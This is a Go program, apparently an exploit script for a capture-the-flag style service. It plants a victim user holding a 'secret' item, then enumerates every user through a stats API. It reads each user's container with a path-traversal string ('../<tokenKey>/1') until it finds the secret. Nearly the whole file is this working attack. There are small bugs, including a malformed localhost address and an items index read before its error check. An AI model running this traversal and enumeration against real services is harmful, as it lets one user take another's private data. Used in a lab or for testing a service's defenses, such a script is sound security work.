package main

import (
	"1_session_generation/pkg/api"
	"1_session_generation/pkg/helper"
	"1_session_generation/pkg/models"
	"errors"
	"fmt"
	log "github.com/sirupsen/logrus"
)

func main() {

	err := Run("127.0.01")
	if err != nil {
		log.Error(err)
		return
	}

}

func Run(addr string) error {
	endpoints, err := CreateVictimUserForTest(addr)
	if err != nil {
		return err
	}

	tokenKey, token, err := helper.CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return err
	}
	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)

	_, err = client.CreateContainer(3, "folder init")

	err, done := ReadAllContainers(client)
	if done {
		return err
	}

	return errors.New("Something wrong")
}

func ReadAllContainers(client *api.Client) (error, bool) {
	for i := 0; true; i++ {
		stat, err := client.GetStat(i*20, (i+1)*20)
		if err != nil {
			return err, true
		}
		if len(stat.Users) == 0 {
			return errors.New("Not found"), true
		}
		for _, user := range stat.Users {
			sprintf := fmt.Sprintf("../%s/1", user.TokenKey)
			log.Info("Try " + sprintf)
			container, err := client.GetContainerInfo(sprintf)
			log.Info(container.Items[0].Description)
			if err != nil {
				log.Warn("Can't get for " + user.TokenKey)
				continue
			}
			for _, item := range container.Items {
				if item.Description == "secret" {
					log.Info("Get secret")
					return nil, true
				}
			}
		}
	}
	return nil, false
}

func CreateVictimUserForTest(addr string) (helper.Endpoints, error) {
	endpoints := helper.GetEndpoint(&addr)
	tokenKey, token, err := helper.CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return helper.Endpoints{}, err
	}
	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)
	cId, err := client.CreateContainer(4, "victim")
	if err != nil {
		return helper.Endpoints{}, err
	}
	err = client.PutItem(models.Item{
		Type:        1,
		Description: "secret",
		Weight:      1,
	}, cId)
	if err != nil {
		return helper.Endpoints{}, err
	}
	return endpoints, nil
}
